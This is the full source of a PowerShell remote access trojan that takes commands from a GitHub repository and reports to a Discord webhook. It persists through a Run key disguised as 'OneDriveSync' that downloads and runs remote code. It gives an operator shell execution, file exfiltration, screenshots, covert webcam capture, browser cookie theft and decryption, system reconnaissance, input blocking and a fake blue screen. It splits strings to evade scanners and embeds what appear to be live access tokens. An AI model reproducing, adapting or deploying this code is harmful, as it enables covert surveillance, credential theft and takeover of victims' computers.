# rat.ps1 — Discord C2 RAT agent
# Polls a command file on GitHub API, executes, reports to a Discord webhook.

# ---- Config (strings split to dodge static scanning) ----
$C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
$T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
$RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'MTU0NjI1Mzk3OTQ1NTk4Nzc0Mg.GpQWle.1R9nKWJPOgt3-AmlOmxrOlb9EvZCg4KPzY35gE'
$S=Join-Path $env:TEMP 'r_s.tmp'
$script:P=2000
$L='1523845613177929828'
$HF=Join-Path $env:TEMP 'rat_hook.txt'

# ---- dedup: exit if another rat.ps1 is already running ----
try{
  $me=[Diagnostics.Process]::GetCurrentProcess().Id
  $dup=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*rat.ps1*' -and $_.ProcessId -ne $me }
  if($dup){ exit }
}catch{}

# ---- HTTP helpers ----
function Post($text){
  try{
    $t=[string]$text
    $n=1900
    if($t.Length -le $n){ Post-One $t }
    else{
      for($i=0; $i -lt $t.Length; $i+=$n){
        Post-One $t.Substring($i,[Math]::Min($n,$t.Length-$i))
      }
    }
  }catch{}
}

function Post-One($text){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('Content-Type','application/json')
    $b=@{'content'=$text}|ConvertTo-Json -Compress
    [void]$wc.UploadString($W,'POST',$b)
    $wc.Dispose()
  }catch{}
}

function Upload-File($path){
  try{
    $bn=[Guid]::NewGuid().ToString()
    $fb=[IO.File]::ReadAllBytes($path)
    $fn=Split-Path $path -Leaf
    $pre="--$bn`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fn`"`r`nContent-Type: application/octet-stream`r`n`r`n"
    $post="`r`n--$bn--`r`n"
    $enc=[Text.Encoding]::ASCII
    $body=New-Object byte[] ($enc.GetByteCount($pre)+$fb.Length+$enc.GetByteCount($post))
    [Array]::Copy($enc.GetBytes($pre),0,$body,0,$enc.GetByteCount($pre))
    [Array]::Copy($fb,0,$body,$enc.GetByteCount($pre),$fb.Length)
    [Array]::Copy($enc.GetBytes($post),0,$body,$enc.GetByteCount($pre)+$fb.Length,$enc.GetByteCount($post))
    $req=[Net.HttpWebRequest]::Create($W)
    $req.Method='POST'
    $req.ContentType="multipart/form-data; boundary=$bn"
    $req.ContentLength=$body.Length
    $rs=$req.GetRequestStream()
    $rs.Write($body,0,$body.Length); $rs.Close()
    $resp=$req.GetResponse(); $resp.Close()
  }catch{}
}

# ---- Screenshot ----
function Shot(){
  try{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $b=[System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.SystemInformation]::VirtualScreen.Width,[System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
    $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
    $g=[Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
    $p=Join-Path $env:TEMP ('s_'+[Guid]::NewGuid().ToString('N')+'.png')
    $bmp.Save($p,[Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Upload-File $p
    Remove-Item $p -Force -EA 0
  }catch{}
}

# ---- Persist ----
function Persist{
  try{
    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
    Post '`[+] persistence enabled`'
  }catch{}
}

# ---- Shutdown ----
function Shutdown-Machine{
  try{
    Post '`[+] shutting down now`'
    Start-Sleep 1
    shutdown /s /t 0
  }catch{}
}

# ---- Wallpaper ----
function Set-Wallpaper($url){
  try{
    $p=Join-Path $env:TEMP 'w.jpg'
    (New-Object Net.WebClient).DownloadFile($url,$p)
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $p
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
    Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value '0'
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True
    Post "`[+] wallpaper set: $url"
  }catch{ Post '`[!] wallpaper failed' }
}

# ---- System recon ----
function Get-Info{
  try{
    $os=Get-CimInstance Win32_OperatingSystem
    $cs=Get-CimInstance Win32_ComputerSystem
    $cpu=Get-CimInstance Win32_Processor
    $gpu=Get-CimInstance Win32_VideoController
    $bb=Get-CimInstance Win32_BaseBoard
    $bios=Get-CimInstance Win32_BIOS
    $ip=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
    if(-not $ip){ $ip=(Get-CimInstance Win32_NetworkAdapterConfiguration -EA 0 | Where-Object {$_.IPAddress} | Select-Object -First 1).IPAddress[0] }
    $up=((Get-Date)-$os.LastBootUpTime)
    $upstr="{0}d {1}h {2}m" -f $up.Days,$up.Hours,$up.Minutes
    $disks=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
    $ramGB=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
    $ramFree=[math]::Round($os.FreePhysicalMemory/1MB,1)
    $procs=Get-Process | Sort-Object CPU -Descending | Select-Object -First 25 | ForEach-Object { "{0,-6} {1,-32} CPU={2}s WS={3}MB" -f $_.Id,$_.ProcessName,[math]::Round($_.CPU,1),[math]::Round($_.WS/1MB,0) }
    $soft=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA 0 | Where-Object {$_.DisplayName} | Select-Object -ExpandProperty DisplayName -Unique | Sort-Object) -join ', '
    $o=@()
    $o+="HOSTNAME  : $($cs.Name)"
    $o+="USERNAME  : $env:USERNAME"
    $o+="DOMAIN    : $env:USERDOMAIN"
    $o+="IP        : $ip"
    $o+="OS        : $($os.Caption) ($($os.Version)) $($os.OSArchitecture)"
    $o+="UPTIME    : $upstr"
    $o+="CPU       : $($cpu.Name) ($($cpu.NumberOfCores)C/$($cpu.NumberOfLogicalProcessors)T)"
    $o+="RAM       : $ramGB GB total / $ramFree GB free"
    $o+="GPU       : $($gpu.Name) ($([math]::Round($gpu.AdapterRAM/1MB,0)) MB)"
    $o+="BOARD     : $($bb.Manufacturer) $($bb.Product)"
    $o+="BIOS      : $($bios.Manufacturer) $($bios.SMBIOSBIOSVersion)"
    $o+="DISKS     :"
    foreach($d in $disks){ $o+="  $($d.DeviceID) $([math]::Round($d.Size/1GB,1)) GB total / $([math]::Round($d.FreeSpace/1GB,1)) GB free" }
    $o+="PROCS (top25):"
    $o+=$procs
    $o+="SOFTWARE  : $soft"
    Post ($o -join "`n")
  }catch{}
}

# ---- Cookies ----
function Get-Cookies($browser){
  try{
    Add-Type -AssemblyName System.Security
    $b=$browser.ToLower()
    $bases=@{
      'chrome'="$env:LOCALAPPDATA\Google\Chrome\User Data"
      'edge'="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
      'brave'="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
      'opera'="$env:APPDATA\Opera Software\Opera Stable"
      'firefox'="$env:APPDATA\Mozilla\Firefox\Profiles"
    }
    if(-not $bases[$b]){ Post "`[!] browser: chrome/firefox/edge/brave/opera"; return }
    $cookies=@()
    if($b -eq 'firefox'){
      $prof=Get-ChildItem $bases[$b] -Directory -EA 0 | Where-Object { Test-Path (Join-Path $_.FullName 'cookies.sqlite') } | Select-Object -First 1
      if(-not $prof){ Post '`[!] no firefox cookies found'; return }
      $src=Join-Path $prof.FullName 'cookies.sqlite'
      $dst=Join-Path $env:TEMP 'ff_cookies.sqlite'
      Copy-Item $src $dst -Force -EA 0
      $raw=[IO.File]::ReadAllText($dst,[Text.Encoding]::GetEncoding('ISO-8859-1'))
      $re=[regex]'(?s)([a-zA-Z0-9\.\-]{3,120}\.[a-zA-Z]{2,12})\x00(.{1,90}?)\x00(.{1,512}?)\x00'
      foreach($m in $re.Matches($raw)){
        $host=$m.Groups[1].Value
        $name=$m.Groups[2].Value
        $val=$m.Groups[3].Value
        if($host -match '\.' -and $name -match '^[a-zA-Z0-9_\-\.=]{1,90}$'){
          $cookies += [pscustomobject]@{host=$host;name=$name;value=$val}
        }
      }
    } else {
      $base=$bases[$b]
      $cand=@((Join-Path $base 'Default\Network\Cookies'),(Join-Path $base 'Default\Cookies'),(Join-Path $base 'Profile 1\Network\Cookies'))
      $src=$cand | Where-Object { Test-Path $_ } | Select-Object -First 1
      if(-not $src){ Post "`[!] no $b cookies found"; return }
      $dst=Join-Path $env:TEMP 'ch_cookies.db'
      Copy-Item $src $dst -Force -EA 0
      $bytes=[IO.File]::ReadAllBytes($dst)
      $raw=[Text.Encoding]::GetEncoding('ISO-8859-1').GetString($bytes)
      $re=[regex]'([a-zA-Z0-9\.\-]{2,120}\.[a-zA-Z]{2,12})([a-zA-Z0-9_\-\.=]{1,64})/'
      $seen=@{}
      foreach($m in $re.Matches($raw)){
        $host=$m.Groups[1].Value
        $name=$m.Groups[2].Value
        if($host -notmatch '\.[a-zA-Z]{2,12}$'){ continue }
        $key="$host|$name"
        if($seen.ContainsKey($key)){ continue }
        $seen[$key]=$true
        # try v10/v11 DPAPI decrypt on the bytes following the match
        $val='(encrypted)'
        $after=$raw.Substring($m.Index + $m.Length)
        $v=[regex]'(v10|v11)([\x00-\xff]{8,600})'
        $vm=$v.Match($after)
        if($vm.Success){
          $enc=[Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($vm.Groups[2].Value)
          try{ $val=[Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser')) }catch{}
        }
        $cookies += [pscustomobject]@{host=$host.TrimStart('.');name=$name;value=$val}
      }
      Remove-Item $dst -Force -EA 0
    }
    if($cookies.Count -eq 0){ Post "`[!] no cookies extracted from $b"; return }
    $json=$cookies | ConvertTo-Json -Compress
    $b64=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
    $hdr="`[COOKIES] $b ($($cookies.Count))`n"
    Post ($hdr + $b64)
  }catch{ Post '`[!] cookie extraction failed' }
}

# ---- MSHTA ----
function Run-Mshta($payload){
  try{
    if($payload -match '^https?://'){ Start-Process mshta.exe -ArgumentList $payload -WindowStyle Hidden }
    else{
      $p=Join-Path $env:TEMP 'm.hta'
      Set-Content -Path $p -Value $payload -Force
      Start-Process mshta.exe -ArgumentList $p -WindowStyle Hidden
    }
    Post "`[+] mshta launched: $payload"
  }catch{ Post '`[!] mshta failed' }
}

# ---- Self destruct ----
function Self-Destruct{
  try{
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
    Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
    Remove-Item $HF -Force -EA 0
    Post '`[+] self destructed`'
    exit
  }catch{ exit }
}

# ---- Webcam ----
function Take-Webcam($idx){
  try{
    $idx=[int]$idx
    if($idx -lt 0){$idx=0}
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $asTaskAction = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction' })[0]
    $asTaskOp = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    function AwaitAction($a){ $tt=$asTaskAction.Invoke($null,@($a)); $tt.Wait(-1)|Out-Null }
    function AwaitOp($a,$rt){ $at=$asTaskOp.MakeGenericMethod($rt); $nt=$at.Invoke($null,@($a)); $nt.Wait(-1)|Out-Null; $nt.Result }
    [void][Windows.Media.Capture.MediaCapture,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Media.Capture.MediaCaptureInitializationSettings,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media,ContentType=WindowsRuntime]
    [void][Windows.Storage.Streams.InMemoryRandomAccessStream,Windows.Storage.Streams,ContentType=WindowsRuntime]
    [void][Windows.Devices.Enumeration.DeviceInformation,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
    [void][Windows.Devices.Enumeration.DeviceInformationCollection,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
    $cap = New-Object Windows.Media.Capture.MediaCapture
    $settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
    $devs = AwaitOp ([Windows.Devices.Enumeration.DeviceInformation]::FindAllAsync([Windows.Devices.Enumeration.DeviceClass]::VideoCapture)) ([Windows.Devices.Enumeration.DeviceInformationCollection])
    if($devs.Count -gt 0){
      if($idx -ge $devs.Count){$idx=0}
      $settings.VideoDeviceId = $devs[$idx].Id
    }
    AwaitAction $cap.InitializeAsync($settings)
    $p = Join-Path $env:TEMP ('cam_'+[Guid]::NewGuid().ToString('N')+'.jpg')
    $imgProp = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
    $stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
    AwaitAction $cap.CapturePhotoToStreamAsync($imgProp, $stream)
    $stream.Seek(0)
    $netStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($stream)
    $ms = New-Object IO.MemoryStream
    $netStream.CopyTo($ms)
    [IO.File]::WriteAllBytes($p, $ms.ToArray())
    Upload-File $p
    Post "[+] webcam shot (cam $idx/$($devs.Count))"
    Remove-Item $p -Force -EA 0
  }catch{ Post "[!] webcam: $($_.Exception.Message)" }
}

# ---- Blue screen ----
function Show-BlueScreen{
  try{
    $inner=@'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$f=New-Object Windows.Forms.Form
$f.FormBorderStyle='None'
$f.WindowState='Maximized'
$f.TopMost=$true
$f.BackColor=[Drawing.Color]::FromArgb(0,120,215)
$f.ControlBox=$false
$lbl=New-Object Windows.Forms.Label
$lbl.Text=":(`r`nYour PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.`r`n`r`nStop code: CRITICAL_PROCESS_DIED"
$lbl.ForeColor=[Drawing.Color]::White
$lbl.Font=New-Object Drawing.Font('Segoe UI',20)
$lbl.Dock='Fill'
$lbl.TextAlign='MiddleLeft'
$lbl.Padding=New-Object Windows.Forms.Padding(80)
$f.Controls.Add($lbl)
$f.ShowDialog()
'@
    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
    Post '`[+] blue screen shown (clears on restart)`'
  }catch{}
}

# ---- Block input (keyboard + mouse) ----
function Block-Input{
  try{
    $cs=@'
using System;
using System.Runtime.InteropServices;
public class IB {
  public delegate IntPtr P(int n, IntPtr w, IntPtr l);
  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, P fn, IntPtr m, uint t);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
  [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint a, uint b);
  [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
  [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
  [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }
  static P kb = Blk, ms = Blk;
  static IntPtr Blk(int n, IntPtr w, IntPtr l){ return n >= 0 ? (IntPtr)1 : CallNextHookEx(IntPtr.Zero, n, w, l); }
  public static void Start(){
    SetWindowsHookEx(13, kb, GetModuleHandle(null), 0);
    SetWindowsHookEx(14, ms, GetModuleHandle(null), 0);
    MSG m;
    while(GetMessage(out m, IntPtr.Zero, 0, 0) > 0){ TranslateMessage(ref m); DispatchMessage(ref m); }
  }
}
'@
    $inner="Add-Type -TypeDefinition @'`n$cs`n'@`n[IB]::Start()"
    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
    Post '`[+] input blocked (keyboard + mouse)`'
  }catch{ Post '`[!] block failed' }
}

# ---- Jumpscare ----
function Jump-Scare($url){
  try{
    $vol=@'
using System;
using System.Runtime.InteropServices;
public class Vol {
  [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte s, uint f, UIntPtr e);
  public static void Max(){ for(int i=0;i<50;i++){ keybd_event(0xAF,0,0,UIntPtr.Zero); keybd_event(0xAF,0,2,UIntPtr.Zero); } }
}
'@
    Add-Type -TypeDefinition $vol
    [Vol]::Max()
    if(-not $url){ $url='https://www.youtube.com/watch?v=dQw4w9WgXcQ' }
    Start-Process $url
    Post '`[+] jumpscare: volume 100% + video opened`'
  }catch{ Post '`[!] jumpscare failed' }
}

# ---- Command dispatcher ----
function Run-Cmd($c){
  try{
    if($c -eq 'block'){ Block-Input }
    elseif($c -eq 'jumpscare'){ Jump-Scare $null }
    elseif($c -like 'jumpscare:*'){ Jump-Scare ($c.Substring(10)) }
    elseif($c -like 'setup:*'){
      $rest=$c.Substring(6)
      $parts=$rest -split ';', 2
      $W=$parts[0]
      $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$parts[1]
      Set-Content $HF ($W + "`n" + $parts[1]) -Force
      Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
      Shot
    }
    elseif($c -eq 'proclist'){
      $o=Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name,Id,@{n='CPU';e={[math]::Round($_.CPU,1)}},@{n='MB';e={[math]::Round($_.WS/1MB,1)}} | Out-String -Width 200
      Post $o
    }
    elseif($c -like 'shell:*'){
      $x=$c.Substring(6)
      $o=cmd /c $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'ps:*'){
      $x=$c.Substring(3)
      $o=powershell -NoP -C $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'download:*'){
      $p=$c.Substring(9).Trim()
      if(Test-Path $p){
        if((Get-Item $p).Length -gt 7MB){ Post "`[!] file too large: $p" }
        else{ $d=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p)); Post "`[FILE] $p`n``````$d``````" }
      } else { Post "`[!] not found: $p" }
    }
    elseif($c -eq 'screenshot' -or $c -eq 'screen'){ Shot }
    elseif($c -eq 'persist'){ Persist }
    elseif($c -eq 'shutdown'){ Shutdown-Machine }
    elseif($c -like 'wallpaper:*'){ Set-Wallpaper ($c.Substring(10)) }
    elseif($c -eq 'info'){ Get-Info }
    elseif($c -like 'cookies:*'){ Get-Cookies ($c.Substring(8)) }
    elseif($c -eq 'cookies'){ Get-Cookies 'chrome' }
    elseif($c -like 'mshta:*'){ Run-Mshta ($c.Substring(6)) }
    elseif($c -eq 'selfdestruct'){ Self-Destruct }
    elseif($c -eq 'webcam'){ Take-Webcam 0 }
    elseif($c -like 'webcam:*'){ Take-Webcam ($c.Substring(7)) }
    elseif($c -eq 'bluescreen'){ Show-BlueScreen }
    elseif($c -like 'sleep:*'){
      $script:P=[int]$c.Substring(6)
      Post "`[+] poll set to $($script:P) ms"
    }
    elseif($c -eq 'kill'){
      Post '`[+] killed`'; exit
    }
    elseif($c -eq 'uninstall'){
      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
      Post '`[+] uninstalled`'; exit
    }
    elseif($c -eq 'whoami'){ Post (whoami) }
    else { Post "`[?] unknown: $c" }
  }catch{}
}

# ---- startup: persist + boot notify ----
try{
  $k=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
  if(-not $k){
    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
  }
}catch{}
$VN=$env:COMPUTERNAME
$VU=$env:USERNAME
$VI=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
if(Test-Path $HF){
  $hf=Get-Content $HF
  $W=$hf[0]
  $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$hf[1]
  Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
  Shot
}else{
  Post "NEWVICTIM $VN $VU $VI"
}

# ---- main loop ----
Post '`[+] rat online`' 
while($true){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $wc.Headers.Add('Accept','application/vnd.github.raw')
    $wc.Headers.Add('Authorization','token '+$T)
    $remote=$wc.DownloadString($C).Trim()
    $wc.Dispose()
    $i=$remote.IndexOf('|')
    if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1).Trim() }
    else{ $cmd=$remote; $nonce=$remote }
    $last=Get-Content $S -Raw -EA SilentlyContinue
    if(-not $last){$last=''}
    $last=$last.Trim()
    if($cmd -and $nonce -ne $last){
      $nonce | Set-Content $S -Force
      Run-Cmd $cmd
    }
  }catch{}
  Start-Sleep -Milliseconds $script:P
}
